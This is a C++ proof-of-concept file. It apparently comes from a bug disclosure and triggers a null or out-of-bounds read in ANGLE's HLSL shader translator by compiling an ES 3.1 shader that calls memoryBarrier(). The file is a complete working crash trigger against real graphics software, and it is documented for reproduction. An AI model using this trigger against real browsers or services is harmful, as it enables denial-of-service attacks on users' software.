// PoC: ANGLE shader translator null pointer dereference in OutputHLSL::visitAggregate
// Bug: OutputHLSL.cpp:2322 — memoryBarrier() has 0 arguments, but default case assumes
//      it's a texture function and accesses (*arguments)[0] out-of-bounds
// Trigger: Compile an ES 3.1 shader containing memoryBarrier() with HLSL output backend.
// Impact: SEGV at address 0x0 (null deref or OOB) — crash/DoS

#include "GLSLANG/ShaderLang.h"
#include <cstdio>

int main() {
    sh::Initialize();

    ShBuiltInResources res;
    sh::InitBuiltInResources(&res);

    const char *shader =
        "#version 310 es\n"
        "precision mediump float;\n"
        "out vec4 fragColor;\n"
        "void main() {\n"
        "    memoryBarrier();\n"  // 0-arg builtin, falls to default case in HLSL output
        "    fragColor = vec4(1.0);\n"
        "}\n";

    // GL_FRAGMENT_SHADER = 0x8B30, SH_HLSL_4_1_OUTPUT = HLSL backend
    ShHandle compiler = sh::ConstructCompiler(0x8B30, SH_GLES3_1_SPEC, SH_HLSL_4_1_OUTPUT, &res);
    if (!compiler) {
        printf("Failed to construct compiler\n");
        return 1;
    }

    ShCompileOptions options = {};
    options.objectCode = true;

    const char *sources[] = {shader};
    printf("Compiling fragment shader with memoryBarrier() -> HLSL output...\n");
    printf("Expected: SEGV at OutputHLSL.cpp:2322 (OOB access on empty arguments)\n");
    sh::Compile(compiler, sources, 1, options);

    sh::Destruct(compiler);
    sh::Finalize();
    return 0;
}
